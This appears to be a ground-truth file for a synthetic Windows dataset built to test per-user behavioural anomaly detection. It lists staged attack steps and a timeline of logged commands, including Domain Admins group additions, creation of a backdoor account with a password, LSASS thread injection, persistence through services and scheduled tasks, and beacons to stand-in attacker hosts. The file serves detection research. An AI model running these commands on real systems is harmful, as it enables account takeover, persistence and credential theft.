# Ground Truth: stats-baseline-detection-20day

**Scenario:** Twenty-day Windows-only dataset for per-user behavioral baseline detection. First 7 days are baseline; next 13 days contain varied synthetic attack activity, including off-hour attacks. The intended evaluation unit is one user x non-overlapping 10-minute window.
Target: approximately 140-150 distinct malicious (user, 10-minute) evaluation windows; validate actual emitted/attributed ground-truth cells after generation because fan-out events may alter counts.

**Generated:** 2026-07-28 18:30:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **arjun.iyer** on **PC-003**: Off-hours remote interactive logon from an external address using stolen credentials
2. **arjun.iyer** on **PC-003**: Host and domain discovery from the compromised workstation
3. **SYSTEM** on **DC-01**: Password spray against domain accounts from the attacker's infrastructure
4. **rahul.verma** on **FILE-01**: Network logon to the file server from a workstation the help-desk account never uses
5. **arjun.iyer** on **PC-003**: Credential dumping - injected thread reads LSASS memory
6. **arjun.iyer** on **PC-003**: Harvested administrator credential used explicitly against the file server
7. **priya.menon** on **DC-01**: Backdoor domain account created with the stolen administrator credential
8. **priya.menon** on **DC-01**: Sprayed sales account promoted into Domain Admins
9. **rohan.mehta** on **DC-01**: Newly privileged sales account signs in to the domain controller
10. **priya.menon** on **FILE-01**: Malicious service installed on the file server for persistence
11. **arjun.iyer** on **PC-003**: Scheduled task registered on the beachhead workstation for persistence
12. **arjun.iyer** on **PC-003**: Internal service sweep across the server VLAN
13. **arjun.iyer** on **FILE-01**: Claims data enumerated and staged into a single archive
14. **arjun.iyer** on **PC-003**: Regular HTTPS command-and-control beaconing
15. **kavya.reddy** on **PC-004**: Second implant beacons slowly to a different operator endpoint
16. **arjun.iyer** on **PC-003**: Domain infrastructure reconnaissance over DNS
17. **arjun.iyer** on **FILE-01**: Weekend collection run against the claims share
18. **arjun.iyer** on **PC-003**: Staged archive exfiltrated over HTTPS in a single large transfer
19. **priya.menon** on **FILE-01**: Security event log cleared to remove traces of the service install
20. **vikram.nair** on **PC-006**: Executive workstation signed into, locked, then unlocked late on a Saturday night
21. **arjun.iyer** on **PC-003**: Compromised analyst account attempts remote service execution on the SQL server
22. **rohan.mehta** on **DC-01**: Newly privileged sales account uses explicit credentials to access a second server
23. **priya.menon** on **DC-01**: Attacker creates a second domain account to preserve access after the first account is noticed
24. **arjun.iyer** on **FILE-01**: Second collection pass targets a different business share after the claims archive
25. **rohan.mehta** on **PC-002**: Privileged account performs an unusual pre-dawn interactive sign-in and launches remote administration tooling
26. **priya.menon** on **FILE-01**: Operator removes the temporary staged archive and disables the persistence service
27. **ananya.sharma** on **PC-001**: MFA fatigue push spam during early morning off-hours
28. **rohan.mehta** on **PC-002**: Pass-the-hash SMB logon from external IP
29. **vikram.nair** on **PC-006**: Registry run-key persistence installation
30. **sneha.patel** on **PC-008**: Domain group membership modification for foothold expansion
31. **arjun.iyer** on **PC-003**: DNS tunneling exfiltration beacon
32. **kavya.reddy** on **PC-004**: PowerShell-based data collection from multiple shares
33. **arjun.iyer** on **FILE-01**: Weekend data staging from finance share - second collection run
34. **vikram.nair** on **PC-006**: Executive workstation lock/unlock sequence at night
35. **rohan.mehta** on **DC-01**: KRBTGT domain password modification for persistence
36. **priya.menon** on **DC-01**: Secondary account creation for redundant access
37. **arjun.iyer** on **FILE-01**: Second-phase log cleanup under claims analyst identity
38. **rohan.mehta** on **PC-002**: Pre-dawn RDP with administrative tooling from promoted account
39. **priya.menon** on **FILE-01**: Service uninstall and artifact removal under sysadmin identity
40. **ananya.sharma** on **PC-001**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
41. **rohan.mehta** on **PC-002**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
42. **arjun.iyer** on **PC-003**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
43. **kavya.reddy** on **PC-004**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
44. **rahul.verma** on **PC-005**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
45. **vikram.nair** on **PC-006**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
46. **priya.menon** on **PC-007**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window
47. **sneha.patel** on **PC-008**: Synthetic beacon attack activity with multiple correlated indicators in one 10-minute window
48. **ananya.sharma** on **PC-001**: Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window
49. **rohan.mehta** on **PC-002**: Synthetic lsass access attack activity with multiple correlated indicators in one 10-minute window
50. **arjun.iyer** on **PC-003**: Synthetic privilege attack activity with multiple correlated indicators in one 10-minute window
51. **kavya.reddy** on **PC-004**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
52. **rahul.verma** on **PC-005**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
53. **vikram.nair** on **PC-006**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
54. **priya.menon** on **PC-007**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
55. **sneha.patel** on **PC-008**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
56. **ananya.sharma** on **PC-001**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
57. **rohan.mehta** on **PC-002**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window
58. **arjun.iyer** on **PC-003**: Synthetic beacon attack activity with multiple correlated indicators in one 10-minute window
59. **kavya.reddy** on **PC-004**: Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window
60. **rahul.verma** on **PC-005**: Synthetic lsass access attack activity with multiple correlated indicators in one 10-minute window
61. **vikram.nair** on **PC-006**: Synthetic privilege attack activity with multiple correlated indicators in one 10-minute window
62. **priya.menon** on **PC-007**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
63. **sneha.patel** on **PC-008**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
64. **ananya.sharma** on **PC-001**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
65. **rohan.mehta** on **PC-002**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
66. **arjun.iyer** on **PC-003**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
67. **kavya.reddy** on **PC-004**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
68. **rahul.verma** on **PC-005**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window
69. **vikram.nair** on **PC-006**: Synthetic beacon attack activity with multiple correlated indicators in one 10-minute window
70. **priya.menon** on **PC-007**: Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window
71. **sneha.patel** on **PC-008**: Synthetic lsass access attack activity with multiple correlated indicators in one 10-minute window
72. **ananya.sharma** on **PC-001**: Synthetic privilege attack activity with multiple correlated indicators in one 10-minute window
73. **rohan.mehta** on **PC-002**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
74. **arjun.iyer** on **PC-003**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
75. **kavya.reddy** on **PC-004**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
76. **rahul.verma** on **PC-005**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
77. **vikram.nair** on **PC-006**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
78. **priya.menon** on **PC-007**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
79. **sneha.patel** on **PC-008**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window
80. **ananya.sharma** on **PC-001**: Synthetic beacon attack activity with multiple correlated indicators in one 10-minute window
81. **rohan.mehta** on **PC-002**: Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window
82. **arjun.iyer** on **PC-003**: Synthetic lsass access attack activity with multiple correlated indicators in one 10-minute window
83. **kavya.reddy** on **PC-004**: Synthetic privilege attack activity with multiple correlated indicators in one 10-minute window
84. **rahul.verma** on **PC-005**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
85. **vikram.nair** on **PC-006**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
86. **priya.menon** on **PC-007**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
87. **sneha.patel** on **PC-008**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
88. **ananya.sharma** on **PC-001**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
89. **rohan.mehta** on **PC-002**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
90. **arjun.iyer** on **PC-003**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window
91. **kavya.reddy** on **PC-004**: Synthetic beacon attack activity with multiple correlated indicators in one 10-minute window
92. **rahul.verma** on **PC-005**: Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window
93. **vikram.nair** on **PC-006**: Synthetic lsass access attack activity with multiple correlated indicators in one 10-minute window
94. **priya.menon** on **PC-007**: Synthetic privilege attack activity with multiple correlated indicators in one 10-minute window
95. **sneha.patel** on **PC-008**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
96. **ananya.sharma** on **PC-001**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
97. **rohan.mehta** on **PC-002**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
98. **arjun.iyer** on **PC-003**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
99. **kavya.reddy** on **PC-004**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
100. **rahul.verma** on **PC-005**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
101. **vikram.nair** on **PC-006**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window
102. **priya.menon** on **PC-007**: Synthetic beacon attack activity with multiple correlated indicators in one 10-minute window
103. **sneha.patel** on **PC-008**: Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window
104. **ananya.sharma** on **PC-001**: Synthetic lsass access attack activity with multiple correlated indicators in one 10-minute window
105. **rohan.mehta** on **PC-002**: Synthetic privilege attack activity with multiple correlated indicators in one 10-minute window
106. **arjun.iyer** on **PC-003**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
107. **kavya.reddy** on **PC-004**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
108. **rahul.verma** on **PC-005**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
109. **vikram.nair** on **PC-006**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
110. **priya.menon** on **PC-007**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
111. **sneha.patel** on **PC-008**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
112. **ananya.sharma** on **PC-001**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window
113. **rohan.mehta** on **PC-002**: Synthetic beacon attack activity with multiple correlated indicators in one 10-minute window
114. **arjun.iyer** on **PC-003**: Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window
115. **kavya.reddy** on **PC-004**: Synthetic lsass access attack activity with multiple correlated indicators in one 10-minute window
116. **rahul.verma** on **PC-005**: Synthetic privilege attack activity with multiple correlated indicators in one 10-minute window
117. **vikram.nair** on **PC-006**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
118. **priya.menon** on **PC-007**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
119. **sneha.patel** on **PC-008**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
120. **ananya.sharma** on **PC-001**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
121. **rohan.mehta** on **PC-002**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
122. **arjun.iyer** on **PC-003**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
123. **kavya.reddy** on **PC-004**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window
124. **rahul.verma** on **PC-005**: Synthetic beacon attack activity with multiple correlated indicators in one 10-minute window
125. **vikram.nair** on **PC-006**: Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window
126. **priya.menon** on **PC-007**: Synthetic lsass access attack activity with multiple correlated indicators in one 10-minute window
127. **sneha.patel** on **PC-008**: Synthetic privilege attack activity with multiple correlated indicators in one 10-minute window
128. **ananya.sharma** on **PC-001**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
129. **rohan.mehta** on **PC-002**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
130. **arjun.iyer** on **PC-003**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
131. **kavya.reddy** on **PC-004**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
132. **rahul.verma** on **PC-005**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
133. **vikram.nair** on **PC-006**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
134. **priya.menon** on **PC-007**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window
135. **sneha.patel** on **PC-008**: Synthetic beacon attack activity with multiple correlated indicators in one 10-minute window
136. **ananya.sharma** on **PC-001**: Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window
137. **rohan.mehta** on **PC-002**: Synthetic lsass access attack activity with multiple correlated indicators in one 10-minute window
138. **arjun.iyer** on **PC-003**: Synthetic privilege attack activity with multiple correlated indicators in one 10-minute window
139. **kavya.reddy** on **PC-004**: Synthetic discovery attack activity with multiple correlated indicators in one 10-minute window
140. **rahul.verma** on **PC-005**: Synthetic remote access attack activity with multiple correlated indicators in one 10-minute window
141. **vikram.nair** on **PC-006**: Synthetic credential use attack activity with multiple correlated indicators in one 10-minute window
142. **priya.menon** on **PC-007**: Synthetic persistence attack activity with multiple correlated indicators in one 10-minute window
143. **sneha.patel** on **PC-008**: Synthetic service attack activity with multiple correlated indicators in one 10-minute window
144. **ananya.sharma** on **PC-001**: Synthetic account change attack activity with multiple correlated indicators in one 10-minute window
145. **rohan.mehta** on **PC-002**: Synthetic share collection attack activity with multiple correlated indicators in one 10-minute window


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2026-08-04 19:45:13 UTC | ananya.sharma | PC-001 | Logon | Network logon from 203.0.113.102 (LogonID: 0x160a0e21) |
| 2026-08-04 20:51:11 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\whoami.exe (PID: 29636) - `whoami /all` |
| 2026-08-04 20:51:24 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 29640) - `systeminfo` |
| 2026-08-04 20:51:58 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\nltest.exe (PID: 29648) - `nltest /dclist:corp.local` |
| 2026-08-04 20:52:36 UTC | ananya.sharma | PC-001 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-04 21:39:32 UTC | arjun.iyer | PC-003 | Logon | Network logon from 203.0.113.47 (LogonID: 0x108fe6e4) |
| 2026-08-04 21:55:10 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\whoami.exe (PID: 55016) - `whoami /all` |
| 2026-08-04 21:55:28 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 55028) - `systeminfo` |
| 2026-08-04 21:55:37 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\net.exe (PID: 55032) - `net group "Domain Admins" /domain` |
| 2026-08-04 21:55:52 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\nltest.exe (PID: 55108) - `nltest /dclist:corp.local` |
| 2026-08-04 21:56:18 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\wbem\WMIC.exe (PID: 55116) - `wmic /node:FILE-01 process list brief` |
| 2026-08-04 22:35:01 UTC | SYSTEM | DC-01 | Credential_Spray | Credential spray: 10 attempts against 6 accounts (success: rohan.mehta at attempt 10) |
| 2026-08-04 23:10:14 UTC | rahul.verma | FILE-01 | Logon | Network logon from 10.10.10.23 (LogonID: 0xcd74e0f) |
| 2026-08-04 23:30:23 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\Temp\svc-host-helper.exe (PID: 55132) - `svc-host-helper.exe --dump-auth` |
| 2026-08-04 23:30:24 UTC | arjun.iyer | PC-003 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-04 23:51:19 UTC | rohan.mehta | PC-002 | Logon | Network logon from 203.0.113.47 (LogonID: 0xc104fd4) |
| 2026-08-04 23:51:37 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 7428) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-04 23:52:21 UTC | rohan.mehta | PC-002 | Connection | Connection to 10.10.10.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-05 00:00:09 UTC | rohan.mehta | PC-002 | Logon | Network logon from 203.0.113.55 (LogonID: 0xc116f6d) |
| 2026-08-05 01:11:22 UTC | arjun.iyer | PC-003 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-05 01:11:49 UTC | arjun.iyer | PC-003 | Logon | Network logon from 10.10.10.23 (LogonID: 0x10aa6e87) |
| 2026-08-05 01:12:33 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\cmd.exe (PID: 55384) - `cmd.exe /c net view \FILE-01` |
| 2026-08-05 01:50:45 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 63112) - `schtasks /query /fo LIST /v` |
| 2026-08-05 01:51:24 UTC | kavya.reddy | PC-004 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-05 01:52:08 UTC | kavya.reddy | PC-004 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-05 07:51:29 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\sc.exe (PID: 38548) - `sc.exe query state= all` |
| 2026-08-05 07:51:59 UTC | rahul.verma | PC-005 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-05 07:52:41 UTC | rahul.verma | PC-005 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-05 09:31:00 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\net.exe (PID: 14368) - `net user svc-sync-check /add /domain` |
| 2026-08-05 09:31:26 UTC | vikram.nair | PC-006 | Account_Created | Account created: svc-sync-check |
| 2026-08-05 09:31:56 UTC | vikram.nair | PC-006 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-05 13:10:48 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\net.exe (PID: 5920) - `net view /domain:corp.local` |
| 2026-08-05 13:11:18 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 5960) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-05 13:11:44 UTC | priya.menon | PC-007 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-05 13:50:31 UTC | sneha.patel | PC-008 | Dns_Query | DNS query: sync-check.corp-update.example (TXT, NOERROR) |
| 2026-08-05 13:50:59 UTC | sneha.patel | PC-008 | Dns_Query | DNS query: k7.sync-check.corp-update.example (A, NOERROR) |
| 2026-08-05 13:51:35 UTC | sneha.patel | PC-008 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-05 14:31:24 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 29688) - `wevtutil qe Security /c:5 /rd:true /f:text` |
| 2026-08-05 14:31:48 UTC | ananya.sharma | PC-001 | Log_Cleared | Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window |
| 2026-08-05 14:32:01 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\cmd.exe (PID: 29692) - `cmd.exe /c sc query EventLog` |
| 2026-08-05 20:31:23 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 7440) - `diag-helper.exe --inspect-auth` |
| 2026-08-05 20:31:39 UTC | rohan.mehta | PC-002 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-05 20:31:48 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 7456) - `powershell.exe -NoProfile -Command "Get-Service"` |
| 2026-08-05 21:15:02 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\reg.exe (PID: 14344) - `reg add "HKLM\Software\Microsoft\Windows\Curren...` |
| 2026-08-06 00:11:26 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\net.exe (PID: 55424) - `net group "Domain Admins" /domain` |
| 2026-08-06 00:12:08 UTC | arjun.iyer | PC-003 | Group_Member_Added | Added rahul.verma to group Remote Desktop Users |
| 2026-08-06 00:12:45 UTC | arjun.iyer | PC-003 | Logon | Network logon from 10.10.10.23 (LogonID: 0x11570915) |
| 2026-08-06 00:39:41 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\net.exe (PID: 25512) - `net group "Domain Admins" sneha.patel /add /domain` |
| 2026-08-06 03:10:48 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\whoami.exe (PID: 63196) - `whoami /all` |
| 2026-08-06 03:11:17 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 63200) - `systeminfo` |
| 2026-08-06 03:11:48 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\nltest.exe (PID: 63224) - `nltest /dclist:corp.local` |
| 2026-08-06 03:12:14 UTC | kavya.reddy | PC-004 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-06 03:31:17 UTC | rahul.verma | PC-005 | Logon | Network logon from 203.0.113.47 (LogonID: 0xd706918) |
| 2026-08-06 03:31:59 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 38648) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-06 03:32:29 UTC | rahul.verma | PC-005 | Connection | Connection to 10.10.10.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-06 04:49:34 UTC | arjun.iyer | PC-003 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-06 05:05:26 UTC | priya.menon | DC-01 | Rdp_Session | RDP session to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-06 05:05:28 UTC | priya.menon | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 44808) - `net user svc-audit-sync Wint3r!Sync2026 /add /d...` |
| 2026-08-06 05:05:29 UTC | priya.menon | DC-01 | Account_Created | Account created: svc-audit-sync |
| 2026-08-06 05:20:13 UTC | priya.menon | DC-01 | Group_Member_Added | Added rohan.mehta to group Domain Admins |
| 2026-08-06 05:20:13 UTC | priya.menon | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 44820) - `net group "Domain Admins" rohan.mehta /add /domain` |
| 2026-08-06 05:44:34 UTC | rohan.mehta | DC-01 | Rdp_Session | RDP session to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-06 06:09:44 UTC | priya.menon | FILE-01 | Rdp_Session | RDP session to 10.10.20.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-06 06:09:45 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 48212) - `sc create AuditSyncSvc binPath= C:\Windows\Temp...` |
| 2026-08-06 06:09:46 UTC | priya.menon | FILE-01 | Service_Installed | Service installed: AuditSyncSvc (C:\Windows\Temp\auditsync.exe) |
| 2026-08-06 06:30:30 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 55292) - `schtasks /Create /TN "OneDriveSyncCheck" /TR "C...` |
| 2026-08-06 06:30:33 UTC | arjun.iyer | PC-003 | Scheduled_Task_Created | Scheduled task created: \OneDriveSyncCheck |
| 2026-08-06 07:10:52 UTC | vikram.nair | PC-006 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-06 07:11:02 UTC | vikram.nair | PC-006 | Logon | Network logon from 10.10.10.23 (LogonID: 0x1a8d3d4f) |
| 2026-08-06 07:11:21 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\cmd.exe (PID: 14440) - `cmd.exe /c net view \FILE-01` |
| 2026-08-06 10:10:45 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5980) - `schtasks /query /fo LIST /v` |
| 2026-08-06 10:11:06 UTC | priya.menon | PC-007 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-06 10:11:48 UTC | priya.menon | PC-007 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-06 12:10:57 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\sc.exe (PID: 25520) - `sc.exe query state= all` |
| 2026-08-06 12:11:02 UTC | sneha.patel | PC-008 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-06 12:11:33 UTC | sneha.patel | PC-008 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-06 12:30:36 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\net.exe (PID: 29724) - `net user svc-sync-check /add /domain` |
| 2026-08-06 12:31:01 UTC | ananya.sharma | PC-001 | Account_Created | Account created: svc-sync-check |
| 2026-08-06 12:31:27 UTC | ananya.sharma | PC-001 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-06 15:10:39 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\net.exe (PID: 7464) - `net view /domain:corp.local` |
| 2026-08-06 15:11:23 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 7468) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-06 15:11:55 UTC | rohan.mehta | PC-002 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-06 18:30:30 UTC | arjun.iyer | PC-003 | Dns_Query | DNS query: sync-check.corp-update.example (TXT, NOERROR) |
| 2026-08-06 18:31:02 UTC | arjun.iyer | PC-003 | Dns_Query | DNS query: k7.sync-check.corp-update.example (A, NOERROR) |
| 2026-08-06 18:31:13 UTC | arjun.iyer | PC-003 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-06 20:50:14 UTC | arjun.iyer | PC-003 | Dns_Query | DNS query: c2-operator-2.attacker.net (TXT, NOERROR) |
| 2026-08-06 21:30:49 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 63272) - `wevtutil qe Security /c:5 /rd:true /f:text` |
| 2026-08-06 21:31:13 UTC | kavya.reddy | PC-004 | Log_Cleared | Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window |
| 2026-08-06 21:31:50 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\cmd.exe (PID: 63292) - `cmd.exe /c sc query EventLog` |
| 2026-08-06 22:51:17 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 38652) - `diag-helper.exe --inspect-auth` |
| 2026-08-06 22:51:59 UTC | rahul.verma | PC-005 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-06 22:52:05 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 38660) - `powershell.exe -NoProfile -Command "Get-Service"` |
| 2026-08-07 02:30:03 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 63060) - `powershell.exe -NoProfile -Command Get-ChildIte...` |
| 2026-08-07 02:50:37 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\net.exe (PID: 14452) - `net group "Domain Admins" /domain` |
| 2026-08-07 02:50:51 UTC | vikram.nair | PC-006 | Group_Member_Added | Added rahul.verma to group Remote Desktop Users |
| 2026-08-07 02:51:20 UTC | vikram.nair | PC-006 | Logon | Network logon from 10.10.10.23 (LogonID: 0x1b20c3a9) |
| 2026-08-07 03:59:48 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 55304) - `powershell.exe -NoProfile -Command 445,1433,598...` |
| 2026-08-07 04:00:10 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-07 04:00:17 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-07 04:00:46 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-07 04:01:10 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-07 04:35:25 UTC | arjun.iyer | FILE-01 | Logon | Network logon from 10.10.10.23 (LogonID: 0xe67f52b) |
| 2026-08-07 04:35:25 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 48216) - `cmd.exe /c dir \FILE-01\Claims /s /b` |
